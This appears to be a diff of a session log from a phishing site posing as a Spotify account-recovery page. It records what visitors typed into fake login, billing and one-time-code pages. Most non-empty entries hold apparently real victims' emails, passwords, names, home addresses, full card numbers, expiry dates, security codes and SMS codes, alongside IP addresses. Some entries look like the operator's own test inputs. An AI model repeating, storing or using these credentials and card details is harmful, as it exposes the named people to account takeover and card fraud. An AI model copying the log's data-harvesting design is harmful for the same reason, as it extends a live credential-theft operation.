@@ -2,6 +2,625 @@
   "activeUsers": [],
   "previousUsers": [
     {
+      "sessionId": "42ce3492-d03e-45a3-8943-8a8021c00dcf",
+      "ip": "81.65.134.97",
+      "country": "FR",
+      "pageUrl": "https://spotify-recovery.com/panel",
+      "eventType": "click",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "": {
+          "value": "qsd",
+          "timestamp": "2025-01-23T04:32:55.864Z"
+        },
+        "inputsConfig": [
+          {
+            "id": 1,
+            "name": "1",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 2,
+            "name": "2",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 3,
+            "name": "3",
+            "type": "hidden",
+            "placeholder": ""
+          }
+        ]
+      },
+      "lastActive": "2025-01-23T18:00:18.854Z",
+      "timestamp": "2025-01-23T18:00:18.854Z",
+      "disconnectedAt": "2025-01-23T18:02:40.968Z"
+    },
+    {
+      "sessionId": "42ce3492-d03e-45a3-8943-8a8021c00dcf",
+      "ip": "81.65.134.97",
+      "country": "FR",
+      "pageUrl": "https://spotify-recovery.com/panel",
+      "eventType": "click",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "": {
+          "value": "qsd",
+          "timestamp": "2025-01-23T04:32:55.864Z"
+        },
+        "inputsConfig": [
+          {
+            "id": 1,
+            "name": "1",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 2,
+            "name": "2",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 3,
+            "name": "3",
+            "type": "hidden",
+            "placeholder": ""
+          }
+        ]
+      },
+      "lastActive": "2025-01-23T17:55:15.265Z",
+      "timestamp": "2025-01-23T17:55:15.265Z",
+      "disconnectedAt": "2025-01-23T17:57:40.936Z"
+    },
+    {
+      "sessionId": "42ce3492-d03e-45a3-8943-8a8021c00dcf",
+      "ip": "81.65.134.97",
+      "country": "FR",
+      "pageUrl": "https://spotify-recovery.com/panel",
+      "eventType": "button_click",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "": {
+          "value": "qsd",
+          "timestamp": "2025-01-23T04:32:55.864Z"
+        },
+        "inputsConfig": [
+          {
+            "id": 1,
+            "name": "1",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 2,
+            "name": "2",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 3,
+            "name": "3",
+            "type": "hidden",
+            "placeholder": ""
+          }
+        ]
+      },
+      "lastActive": "2025-01-23T17:46:00.476Z",
+      "timestamp": "2025-01-23T17:46:00.476Z",
+      "disconnectedAt": "2025-01-23T17:48:10.916Z"
+    },
+    {
+      "sessionId": "f8be4564-5042-4c25-bc49-095b1c5d17fc",
+      "ip": "142.188.55.227",
+      "country": "CA",
+      "pageUrl": "https://spotify-recovery.com/billingUpdate_Error",
+      "eventType": "page_unload",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "login-username": {
+          "value": "sabine@unisongroup.ca",
+          "timestamp": "2025-01-23T17:38:36.748Z"
+        },
+        "login-password": {
+          "value": "Unison1!@",
+          "timestamp": "2025-01-23T17:38:55.885Z"
+        },
+        "street": {
+          "value": "9 Davies Avenue",
+          "timestamp": "2025-01-23T17:40:50.888Z"
+        },
+        "firstName": {
+          "value": "Sabine",
+          "timestamp": "2025-01-23T17:40:50.671Z"
+        },
+        "lastName": {
+          "value": "Grimes",
+          "timestamp": "2025-01-23T17:40:50.791Z"
+        },
+        "city": {
+          "value": "Toronto",
+          "timestamp": "2025-01-23T17:40:50.904Z"
+        },
+        "state": {
+          "value": "ONTARIO",
+          "timestamp": "2025-01-23T17:40:50.922Z"
+        },
+        "postalCode": {
+          "value": "M4M 2A6",
+          "timestamp": "2025-01-23T17:40:51.030Z"
+        },
+        "paymentMethod": {
+          "value": "cards",
+          "timestamp": "2025-01-23T17:42:05.069Z"
+        },
+        "cardNumber": {
+          "value": "4520707036718263",
+          "timestamp": "2025-01-23T17:42:06.775Z"
+        },
+        "expiryDate": {
+          "value": "02/29",
+          "timestamp": "2025-01-23T17:42:09.845Z"
+        },
+        "securityCode": {
+          "value": "932",
+          "timestamp": "2025-01-23T17:42:13.566Z"
+        },
+        "sms": {
+          "value": "214724",
+          "timestamp": "2025-01-23T17:45:43.121Z"
+        }
+      },
+      "lastActive": "2025-01-23T17:46:41.955Z",
+      "timestamp": "2025-01-23T17:46:41.955Z",
+      "disconnectedAt": "2025-01-23T17:46:41.955Z"
+    },
+    {
+      "sessionId": "2e66e9df-3742-4ad3-bf0e-81523c899b1f",
+      "ip": "197.14.185.175",
+      "country": "TN",
+      "pageUrl": "https://spotify-recovery.com/panel",
+      "eventType": "click",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "": {
+          "value": "Digite su NIP dinámico",
+          "timestamp": "2025-01-21T18:23:02.574Z"
+        }
+      },
+      "lastActive": "2025-01-23T17:43:49.801Z",
+      "timestamp": "2025-01-23T17:43:49.801Z",
+      "disconnectedAt": "2025-01-23T17:46:10.909Z"
+    },
+    {
+      "sessionId": "f8be4564-5042-4c25-bc49-095b1c5d17fc",
+      "ip": "142.188.55.227",
+      "country": "CA",
+      "pageUrl": "https://spotify-recovery.com/otp_submitError",
+      "eventType": "page_unload",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "login-username": {
+          "value": "sabine@unisongroup.ca",
+          "timestamp": "2025-01-23T17:38:36.748Z"
+        },
+        "login-password": {
+          "value": "Unison1!@",
+          "timestamp": "2025-01-23T17:38:55.885Z"
+        },
+        "street": {
+          "value": "9 Davies Avenue",
+          "timestamp": "2025-01-23T17:40:50.888Z"
+        },
+        "firstName": {
+          "value": "Sabine",
+          "timestamp": "2025-01-23T17:40:50.671Z"
+        },
+        "lastName": {
+          "value": "Grimes",
+          "timestamp": "2025-01-23T17:40:50.791Z"
+        },
+        "city": {
+          "value": "Toronto",
+          "timestamp": "2025-01-23T17:40:50.904Z"
+        },
+        "state": {
+          "value": "ONTARIO",
+          "timestamp": "2025-01-23T17:40:50.922Z"
+        },
+        "postalCode": {
+          "value": "M4M 2A6",
+          "timestamp": "2025-01-23T17:40:51.030Z"
+        },
+        "paymentMethod": {
+          "value": "cards",
+          "timestamp": "2025-01-23T17:42:05.069Z"
+        },
+        "cardNumber": {
+          "value": "4520707036718263",
+          "timestamp": "2025-01-23T17:42:06.775Z"
+        },
+        "expiryDate": {
+          "value": "02/29",
+          "timestamp": "2025-01-23T17:42:09.845Z"
+        },
+        "securityCode": {
+          "value": "932",
+          "timestamp": "2025-01-23T17:42:13.566Z"
+        },
+        "sms": {
+          "value": "214724",
+          "timestamp": "2025-01-23T17:45:43.121Z"
+        }
+      },
+      "lastActive": "2025-01-23T17:46:00.704Z",
+      "timestamp": "2025-01-23T17:46:00.704Z",
+      "lastRouteChange": "2025-01-23T17:46:00.469Z",
+      "disconnectedAt": "2025-01-23T17:46:00.704Z"
+    },
+    {
+      "sessionId": "f8be4564-5042-4c25-bc49-095b1c5d17fc",
+      "ip": "142.188.55.227",
+      "country": "CA",
+      "pageUrl": "https://spotify-recovery.com/otp_submitError",
+      "eventType": "page_unload",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "login-username": {
+          "value": "sabine@unisongroup.ca",
+          "timestamp": "2025-01-23T17:38:36.748Z"
+        },
+        "login-password": {
+          "value": "Unison1!@",
+          "timestamp": "2025-01-23T17:38:55.885Z"
+        },
+        "street": {
+          "value": "9 Davies Avenue",
+          "timestamp": "2025-01-23T17:40:50.888Z"
+        },
+        "firstName": {
+          "value": "Sabine",
+          "timestamp": "2025-01-23T17:40:50.671Z"
+        },
+        "lastName": {
+          "value": "Grimes",
+          "timestamp": "2025-01-23T17:40:50.791Z"
+        },
+        "city": {
+          "value": "Toronto",
+          "timestamp": "2025-01-23T17:40:50.904Z"
+        },
+        "state": {
+          "value": "ONTARIO",
+          "timestamp": "2025-01-23T17:40:50.922Z"
+        },
+        "postalCode": {
+          "value": "M4M 2A6",
+          "timestamp": "2025-01-23T17:40:51.030Z"
+        },
+        "paymentMethod": {
+          "value": "cards",
+          "timestamp": "2025-01-23T17:42:05.069Z"
+        },
+        "cardNumber": {
+          "value": "4520707036718263",
+          "timestamp": "2025-01-23T17:42:06.775Z"
+        },
+        "expiryDate": {
+          "value": "02/29",
+          "timestamp": "2025-01-23T17:42:09.845Z"
+        },
+        "securityCode": {
+          "value": "932",
+          "timestamp": "2025-01-23T17:42:13.566Z"
+        },
+        "sms": {
+          "value": "214724",
+          "timestamp": "2025-01-23T17:45:43.121Z"
+        }
+      },
+      "lastActive": "2025-01-23T17:45:21.744Z",
+      "timestamp": "2025-01-23T17:45:21.744Z",
+      "lastRouteChange": "2025-01-23T17:45:21.530Z",
+      "disconnectedAt": "2025-01-23T17:45:21.744Z"
+    },
+    {
+      "sessionId": "f8be4564-5042-4c25-bc49-095b1c5d17fc",
+      "ip": "142.188.55.227",
+      "country": "CA",
+      "pageUrl": "https://spotify-recovery.com/otp_submitError",
+      "eventType": "page_unload",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "login-username": {
+          "value": "sabine@unisongroup.ca",
+          "timestamp": "2025-01-23T17:38:36.748Z"
+        },
+        "login-password": {
+          "value": "Unison1!@",
+          "timestamp": "2025-01-23T17:38:55.885Z"
+        },
+        "street": {
+          "value": "9 Davies Avenue",
+          "timestamp": "2025-01-23T17:40:50.888Z"
+        },
+        "firstName": {
+          "value": "Sabine",
+          "timestamp": "2025-01-23T17:40:50.671Z"
+        },
+        "lastName": {
+          "value": "Grimes",
+          "timestamp": "2025-01-23T17:40:50.791Z"
+        },
+        "city": {
+          "value": "Toronto",
+          "timestamp": "2025-01-23T17:40:50.904Z"
+        },
+        "state": {
+          "value": "ONTARIO",
+          "timestamp": "2025-01-23T17:40:50.922Z"
+        },
+        "postalCode": {
+          "value": "M4M 2A6",
+          "timestamp": "2025-01-23T17:40:51.030Z"
+        },
+        "paymentMethod": {
+          "value": "cards",
+          "timestamp": "2025-01-23T17:42:05.069Z"
+        },
+        "cardNumber": {
+          "value": "4520707036718263",
+          "timestamp": "2025-01-23T17:42:06.775Z"
+        },
+        "expiryDate": {
+          "value": "02/29",
+          "timestamp": "2025-01-23T17:42:09.845Z"
+        },
+        "securityCode": {
+          "value": "932",
+          "timestamp": "2025-01-23T17:42:13.566Z"
+        },
+        "sms": {
+          "value": "214724",
+          "timestamp": "2025-01-23T17:45:43.121Z"
+        }
+      },
+      "lastActive": "2025-01-23T17:44:51.855Z",
+      "timestamp": "2025-01-23T17:44:51.855Z",
+      "lastRouteChange": "2025-01-23T17:44:51.487Z",
+      "disconnectedAt": "2025-01-23T17:44:51.855Z"
+    },
+    {
+      "sessionId": "f8be4564-5042-4c25-bc49-095b1c5d17fc",
+      "ip": "142.188.55.227",
+      "country": "CA",
+      "pageUrl": "https://spotify-recovery.com/otp_submit",
+      "eventType": "page_unload",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "login-username": {
+          "value": "sabine@unisongroup.ca",
+          "timestamp": "2025-01-23T17:38:36.748Z"
+        },
+        "login-password": {
+          "value": "Unison1!@",
+          "timestamp": "2025-01-23T17:38:55.885Z"
+        },
+        "street": {
+          "value": "9 Davies Avenue",
+          "timestamp": "2025-01-23T17:40:50.888Z"
+        },
+        "firstName": {
+          "value": "Sabine",
+          "timestamp": "2025-01-23T17:40:50.671Z"
+        },
+        "lastName": {
+          "value": "Grimes",
+          "timestamp": "2025-01-23T17:40:50.791Z"
+        },
+        "city": {
+          "value": "Toronto",
+          "timestamp": "2025-01-23T17:40:50.904Z"
+        },
+        "state": {
+          "value": "ONTARIO",
+          "timestamp": "2025-01-23T17:40:50.922Z"
+        },
+        "postalCode": {
+          "value": "M4M 2A6",
+          "timestamp": "2025-01-23T17:40:51.030Z"
+        },
+        "paymentMethod": {
+          "value": "cards",
+          "timestamp": "2025-01-23T17:42:05.069Z"
+        },
+        "cardNumber": {
+          "value": "4520707036718263",
+          "timestamp": "2025-01-23T17:42:06.775Z"
+        },
+        "expiryDate": {
+          "value": "02/29",
+          "timestamp": "2025-01-23T17:42:09.845Z"
+        },
+        "securityCode": {
+          "value": "932",
+          "timestamp": "2025-01-23T17:42:13.566Z"
+        },
+        "sms": {
+          "value": "214724",
+          "timestamp": "2025-01-23T17:45:43.121Z"
+        }
+      },
+      "lastActive": "2025-01-23T17:44:30.017Z",
+      "timestamp": "2025-01-23T17:44:30.017Z",
+      "lastRouteChange": "2025-01-23T17:44:29.800Z",
+      "disconnectedAt": "2025-01-23T17:44:30.017Z"
+    },
+    {
+      "sessionId": "f8be4564-5042-4c25-bc49-095b1c5d17fc",
+      "ip": "142.188.55.227",
+      "country": "CA",
+      "pageUrl": "https://spotify-recovery.com/billingUpdate",
+      "eventType": "page_unload",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "login-username": {
+          "value": "sabine@unisongroup.ca",
+          "timestamp": "2025-01-23T17:38:36.748Z"
+        },
+        "login-password": {
+          "value": "Unison1!@",
+          "timestamp": "2025-01-23T17:38:55.885Z"
+        },
+        "street": {
+          "value": "9 Davies Avenue",
+          "timestamp": "2025-01-23T17:40:50.888Z"
+        },
+        "firstName": {
+          "value": "Sabine",
+          "timestamp": "2025-01-23T17:40:50.671Z"
+        },
+        "lastName": {
+          "value": "Grimes",
+          "timestamp": "2025-01-23T17:40:50.791Z"
+        },
+        "city": {
+          "value": "Toronto",
+          "timestamp": "2025-01-23T17:40:50.904Z"
+        },
+        "state": {
+          "value": "ONTARIO",
+          "timestamp": "2025-01-23T17:40:50.922Z"
+        },
+        "postalCode": {
+          "value": "M4M 2A6",
+          "timestamp": "2025-01-23T17:40:51.030Z"
+        },
+        "paymentMethod": {
+          "value": "cards",
+          "timestamp": "2025-01-23T17:42:05.069Z"
+        },
+        "cardNumber": {
+          "value": "4520707036718263",
+          "timestamp": "2025-01-23T17:42:06.775Z"
+        },
+        "expiryDate": {
+          "value": "02/29",
+          "timestamp": "2025-01-23T17:42:09.845Z"
+        },
+        "securityCode": {
+          "value": "932",
+          "timestamp": "2025-01-23T17:42:13.566Z"
+        },
+        "sms": {
+          "value": "214724",
+          "timestamp": "2025-01-23T17:45:43.121Z"
+        }
+      },
+      "lastActive": "2025-01-23T17:44:14.364Z",
+      "timestamp": "2025-01-23T17:44:14.364Z",
+      "lastRouteChange": "2025-01-23T17:44:14.034Z",
+      "disconnectedAt": "2025-01-23T17:44:14.364Z"
+    },
+    {
+      "sessionId": "2e66e9df-3742-4ad3-bf0e-81523c899b1f",
+      "ip": "41.227.209.217",
+      "country": "TN",
+      "pageUrl": "https://spotify-recovery.com/panel",
+      "eventType": "key_press",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "": {
+          "value": "Digite su NIP dinámico",
+          "timestamp": "2025-01-21T18:23:02.574Z"
+        }
+      },
+      "lastActive": "2025-01-23T10:10:16.190Z",
+      "timestamp": "2025-01-23T10:10:16.190Z",
+      "disconnectedAt": "2025-01-23T10:12:39.736Z"
+    },
+    {
+      "sessionId": "aef93b4a-62c1-41ba-ba0f-81da283d979a",
+      "ip": "201.146.180.75",
+      "country": "MX",
+      "pageUrl": "https://spotify-recovery.com/billingUpdate_Error",
+      "eventType": "page_load",
+      "browserInfo": "Apple Safari",
+      "inputs": {
+        "login-username": {
+          "value": "rretana76@gmail.com",
+          "timestamp": "2025-01-23T09:50:38.475Z"
+        },
+        "login-password": {
+          "value": "72769605",
+          "timestamp": "2025-01-23T09:50:38.496Z"
+        },
+        "firstName": {
+          "value": "Rafael",
+          "timestamp": "2025-01-23T09:50:46.965Z"
+        },
+        "lastName": {
+          "value": "Retana",
+          "timestamp": "2025-01-23T09:50:47.942Z"
+        },
+        "street": {
+          "value": "Camino Viejo a San José8981",
+          "timestamp": "2025-01-23T09:51:05.190Z"
+        },
+        "paymentMethod": {
+          "value": "cards",
+          "timestamp": "2025-01-23T09:51:45.742Z"
+        },
+        "cardNumber": {
+          "value": "5460800009062014",
+          "timestamp": "2025-01-23T09:52:30.434Z"
+        },
+        "expiryDate": {
+          "value": "07/29",
+          "timestamp": "2025-01-23T09:52:39.777Z"
+        },
+        "securityCode": {
+          "value": "384",
+          "timestamp": "2025-01-23T09:52:45.213Z"
+        }
+      },
+      "lastActive": "2025-01-23T10:10:12.454Z",
+      "timestamp": "2025-01-23T10:10:12.454Z",
+      "lastRouteChange": "2025-01-23T10:10:11.832Z",
+      "disconnectedAt": "2025-01-23T10:12:39.735Z"
+    },
+    {
+      "sessionId": "2e66e9df-3742-4ad3-bf0e-81523c899b1f",
+      "ip": "41.227.209.217",
+      "country": "TN",
+      "pageUrl": "https://spotify-recovery.com/panel",
+      "eventType": "button_click",
+      "browserInfo": "Google Chrome",
+      "inputs": {
+        "": {
+          "value": "Digite su NIP dinámico",
+          "timestamp": "2025-01-21T18:23:02.574Z"
+        }
+      },
+      "lastActive": "2025-01-23T10:07:38.070Z",
+      "timestamp": "2025-01-23T10:07:38.070Z",
+      "disconnectedAt": "2025-01-23T10:09:39.729Z"
+    },
+    {
+      "sessionId": "2bdd210a-956b-4cfc-aace-d244aef1b222",
+      "ip": "205.169.39.22",
+      "country": "US",
+      "pageUrl": "https://spotify-recovery.com/",
+      "eventType": "page_load",
+      "browserInfo": "Google Chrome",
+      "inputs": {},
+      "lastActive": "2025-01-22T12:58:54.514Z",
+      "timestamp": "2025-01-22T12:58:54.514Z",
+      "disconnectedAt": "2025-01-22T13:01:18.297Z"
+    },
+    {
       "sessionId": "0f699305-20fc-4305-86e1-6bf2029eb4a7",
       "ip": "51.136.22.105",
       "country": "NL",
@@ -845,405 +1464,41 @@
       "disconnectedAt": "2025-01-21T22:07:46.991Z"
     },
     {
-      "sessionId": "daffec0e-213d-4f04-adc8-dc5a199f1f5c",
-      "ip": "205.169.39.15",
-      "country": "US",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T12:58:49.636Z",
-      "timestamp": "2025-01-22T12:58:49.636Z",
-      "disconnectedAt": "2025-01-22T13:01:18.297Z"
-    },
-    {
-      "sessionId": "e93fac68-4009-48db-be49-4b474821c2ac",
-      "ip": "205.169.39.12",
-      "country": "US",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T12:58:50.442Z",
-      "timestamp": "2025-01-22T12:58:50.442Z",
-      "disconnectedAt": "2025-01-22T13:01:18.297Z"
-    },
-    {
-      "sessionId": "dc360da4-7004-4228-a3b1-7a56a3bb2b9f",
-      "ip": "205.169.39.6",
-      "country": "US",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Apple Safari",
-      "inputs": {},
-      "lastActive": "2025-01-22T12:58:54.483Z",
-      "timestamp": "2025-01-22T12:58:54.483Z",
-      "disconnectedAt": "2025-01-22T13:01:18.297Z"
-    },
-    {
-      "sessionId": "2bdd210a-956b-4cfc-aace-d244aef1b222",
-      "ip": "205.169.39.22",
-      "country": "US",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T12:58:54.514Z",
-      "timestamp": "2025-01-22T12:58:54.514Z",
-      "disconnectedAt": "2025-01-22T13:01:18.297Z"
-    },
-    {
-      "sessionId": "97d0c45b-2352-433c-8717-f825294bcc4f",
-      "ip": "196.229.209.122",
-      "country": "TN",
-      "pageUrl": "https://spotify-recovery.com/panel",
-      "eventType": "page_unload",
-      "browserInfo": "Google Chrome",
-      "inputs": {
-        "": {
-          "value": " ",
-          "timestamp": "2025-01-21T17:04:55.548Z"
-        },
-        "login-username": {
-          "value": "zzererz\"\"",
-          "timestamp": "2025-01-22T13:00:41.511Z"
-        },
-        "login-password": {
-          "value": "ezrzrerezr",
-          "timestamp": "2025-01-22T13:00:37.893Z"
-        },
-        "street": {
-          "value": "Route el ain bp166",
-          "timestamp": "2025-01-22T13:01:06.058Z"
-        },
-        "city": {
-          "value": "Sfax",
-          "timestamp": "2025-01-22T13:01:06.070Z"
-        },
-        "firstName": {
-          "value": "Chedli",
-          "timestamp": "2025-01-22T13:01:06.077Z"
-        },
-        "lastName": {
-          "value": "Abdelhedi",
-          "timestamp": "2025-01-22T13:01:06.085Z"
-        },
-        "postalCode": {
-          "value": "3042",
-          "timestamp": "2025-01-22T13:01:06.167Z"
-        },
-        "state": {
-          "value": "LA",
-          "timestamp": "2025-01-22T13:01:07.941Z"
-        },
-        "paymentMethod": {
-          "value": "cards",
-          "timestamp": "2025-01-22T13:01:26.523Z"
-        },
-        "cardNumber": {
-          "value": "4111 1111 1111 111",
-          "timestamp": "2025-01-22T13:01:31.417Z"
-        },
-        "expiryDate": {
-          "value": "12/28",
-          "timestamp": "2025-01-22T13:01:32.442Z"
-        },
-        "securityCode": {
-          "value": "456",
-          "timestamp": "2025-01-22T13:01:33.177Z"
-        },
-        "sms": {
-          "value": "11111111",
-          "timestamp": "2025-01-22T13:02:03.046Z"
-        }
-      },
-      "lastActive": "2025-01-22T13:01:57.597Z",
-      "timestamp": "2025-01-22T13:01:57.597Z",
-      "lastRouteChange": "2025-01-22T13:01:57.489Z",
-      "disconnectedAt": "2025-01-22T13:01:57.597Z"
-    },
-    {
-      "sessionId": "97d0c45b-2352-433c-8717-f825294bcc4f",
-      "ip": "196.229.209.122",
-      "country": "TN",
-      "pageUrl": "https://spotify-recovery.com/otp_submit",
-      "eventType": "page_unload",
-      "browserInfo": "Google Chrome",
-      "inputs": {
-        "": {
-          "value": " ",
-          "timestamp": "2025-01-21T17:04:55.548Z"
-        },
-        "login-username": {
-          "value": "zzererz\"\"",
-          "timestamp": "2025-01-22T13:00:41.511Z"
-        },
-        "login-password": {
-          "value": "ezrzrerezr",
-          "timestamp": "2025-01-22T13:00:37.893Z"
-        },
-        "street": {
-          "value": "Route el ain bp166",
-          "timestamp": "2025-01-22T13:01:06.058Z"
-        },
-        "city": {
-          "value": "Sfax",
-          "timestamp": "2025-01-22T13:01:06.070Z"
-        },
-        "firstName": {
-          "value": "Chedli",
-          "timestamp": "2025-01-22T13:01:06.077Z"
-        },
-        "lastName": {
-          "value": "Abdelhedi",
-          "timestamp": "2025-01-22T13:01:06.085Z"
-        },
-        "postalCode": {
-          "value": "3042",
-          "timestamp": "2025-01-22T13:01:06.167Z"
-        },
-        "state": {
-          "value": "LA",
-          "timestamp": "2025-01-22T13:01:07.941Z"
-        },
-        "paymentMethod": {
-          "value": "cards",
-          "timestamp": "2025-01-22T13:01:26.523Z"
-        },
-        "cardNumber": {
-          "value": "4111 1111 1111 111",
-          "timestamp": "2025-01-22T13:01:31.417Z"
-        },
-        "expiryDate": {
-          "value": "12/28",
-          "timestamp": "2025-01-22T13:01:32.442Z"
-        },
-        "securityCode": {
-          "value": "456",
-          "timestamp": "2025-01-22T13:01:33.177Z"
-        },
-        "sms": {
-          "value": "11111111",
-          "timestamp": "2025-01-22T13:02:03.046Z"
-        }
-      },
-      "lastActive": "2025-01-22T13:03:17.648Z",
-      "timestamp": "2025-01-22T13:03:17.648Z",
-      "disconnectedAt": "2025-01-22T13:03:17.648Z"
-    },
-    {
-      "sessionId": null,
-      "ip": "196.229.209.122",
-      "country": "TN",
-      "pageUrl": "https://spotify-recovery.com/panel",
-      "eventType": "page_unload",
-      "browserInfo": "Google Chrome",
-      "inputs": {
-        "login-username": {
-          "value": "jm@leathermex.com",
-          "timestamp": "2025-01-20T23:47:10.121Z"
-        },
-        "login-password": {
-          "value": "juan2001",
-          "timestamp": "2025-01-20T23:47:16.110Z"
-        },
-        "firstName": {
-          "value": "Juan",
-          "timestamp": "2025-01-20T23:47:35.545Z"
-        },
-        "lastName": {
-          "value": "trevino",
-          "timestamp": "2025-01-20T23:47:41.141Z"
-        },
-        "street": {
-          "value": "Bosques del istmo 315",
-          "timestamp": "2025-01-20T23:48:14.956Z"
-        },
-        "city": {
-          "value": "san pedro garza garcia",
-          "timestamp": "2025-01-20T23:48:28.208Z"
-        },
-        "state": {
-          "value": "nuevo leon",
-          "timestamp": "2025-01-20T23:48:43.829Z"
-        },
-        "postalCode": {
-          "value": "66250",
-          "timestamp": "2025-01-20T23:48:49.126Z"
-        },
-        "paymentMethod": {
-          "value": "cards",
-          "timestamp": "2025-01-20T23:49:05.680Z"
-        },
-        "cardNumber": {
-          "value": "3766 6603 1893 005",
-          "timestamp": "2025-01-20T23:49:53.379Z"
-        },
-        "expiryDate": {
-          "value": "07/28",
-          "timestamp": "2025-01-20T23:50:07.242Z"
-        },
-        "securityCode": {
-          "value": "7657",
-          "timestamp": "2025-01-20T23:50:14.751Z"
-        }
-      },
-      "lastActive": "2025-01-22T13:03:28.113Z",
-      "timestamp": "2025-01-22T13:03:28.113Z",
-      "disconnectedAt": "2025-01-22T13:03:28.113Z"
-    },
-    {
-      "sessionId": "97d0c45b-2352-433c-8717-f825294bcc4f",
-      "ip": "196.229.209.122",
-      "country": "TN",
+      "sessionId": "42ce3492-d03e-45a3-8943-8a8021c00dcf",
+      "ip": "37.67.156.163",
+      "country": "FR",
       "pageUrl": "https://spotify-recovery.com/panel",
       "eventType": "page_load",
       "browserInfo": "Google Chrome",
       "inputs": {
         "": {
-          "value": " ",
-          "timestamp": "2025-01-21T17:04:55.548Z"
+          "value": "qsd",
+          "timestamp": "2025-01-23T04:32:55.864Z"
         },
-        "login-username": {
-          "value": "zzererz\"\"",
-          "timestamp": "2025-01-22T13:00:41.511Z"
-        },
-        "login-password": {
-          "value": "ezrzrerezr",
-          "timestamp": "2025-01-22T13:00:37.893Z"
-        },
-        "street": {
-          "value": "Route el ain bp166",
-          "timestamp": "2025-01-22T13:01:06.058Z"
-        },
-        "city": {
-          "value": "Sfax",
-          "timestamp": "2025-01-22T13:01:06.070Z"
-        },
-        "firstName": {
-          "value": "Chedli",
-          "timestamp": "2025-01-22T13:01:06.077Z"
-        },
-        "lastName": {
-          "value": "Abdelhedi",
-          "timestamp": "2025-01-22T13:01:06.085Z"
-        },
-        "postalCode": {
-          "value": "3042",
-          "timestamp": "2025-01-22T13:01:06.167Z"
-        },
-        "state": {
-          "value": "LA",
-          "timestamp": "2025-01-22T13:01:07.941Z"
-        },
-        "paymentMethod": {
-          "value": "cards",
-          "timestamp": "2025-01-22T13:01:26.523Z"
-        },
-        "cardNumber": {
-          "value": "4111 1111 1111 111",
-          "timestamp": "2025-01-22T13:01:31.417Z"
-        },
-        "expiryDate": {
-          "value": "12/28",
-          "timestamp": "2025-01-22T13:01:32.442Z"
-        },
-        "securityCode": {
-          "value": "456",
-          "timestamp": "2025-01-22T13:01:33.177Z"
-        },
-        "sms": {
-          "value": "11111111",
-          "timestamp": "2025-01-22T13:02:03.046Z"
-        }
+        "inputsConfig": [
+          {
+            "id": 1,
+            "name": "1",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 2,
+            "name": "2",
+            "type": "text",
+            "placeholder": "qsd"
+          },
+          {
+            "id": 3,
+            "name": "3",
+            "type": "hidden",
+            "placeholder": ""
+          }
+        ]
       },
-      "lastActive": "2025-01-22T13:03:17.837Z",
-      "timestamp": "2025-01-22T13:03:17.837Z",
-      "disconnectedAt": "2025-01-22T13:05:18.305Z"
-    },
-    {
-      "sessionId": "e84ffb30-1664-4f79-8d59-a8d092aa74b9",
-      "ip": "196.229.209.122",
-      "country": "TN",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T13:03:43.391Z",
-      "timestamp": "2025-01-22T13:03:43.391Z",
-      "disconnectedAt": "2025-01-22T13:05:48.305Z"
-    },
-    {
-      "sessionId": "e84ffb30-1664-4f79-8d59-a8d092aa74b9",
-      "ip": "196.229.209.122",
-      "country": "TN",
-      "pageUrl": "https://spotify-recovery.com/container",
-      "eventType": "page_navigation",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T13:11:39.142Z",
-      "timestamp": "2025-01-22T13:11:39.142Z",
-      "disconnectedAt": "2025-01-22T13:13:48.326Z"
-    },
-    {
-      "sessionId": "fe57f00f-690e-4380-b5ba-83ab3de4dc67",
-      "ip": "187.189.129.72",
-      "country": "MX",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T13:17:29.714Z",
-      "timestamp": "2025-01-22T13:17:29.714Z",
-      "disconnectedAt": "2025-01-22T13:19:48.330Z"
-    },
-    {
-      "sessionId": "63a2d499-5570-42ce-b01c-71af17516468",
-      "ip": "34.72.176.129",
-      "country": "US",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T13:17:33.337Z",
-      "timestamp": "2025-01-22T13:17:33.337Z",
-      "disconnectedAt": "2025-01-22T13:19:48.330Z"
-    },
-    {
-      "sessionId": "e6ddfa35-cb45-409b-9252-896f1ef655a3",
-      "ip": "205.169.39.181",
-      "country": "US",
-      "pageUrl": "https://spotify-recovery.com/",
-      "eventType": "page_load",
-      "browserInfo": "Google Chrome",
-      "inputs": {},
-      "lastActive": "2025-01-22T13:18:12.563Z",
-      "timestamp": "2025-01-22T13:18:12.563Z",
-      "disconnectedAt": "2025-01-22T13:20:18.328Z"
-    },
-    {
-      "sessionId": "cc86d51f-9249-4522-9f48-2a23205c826a",
-      "ip": "201.157.30.133",
-      "country": "MX",
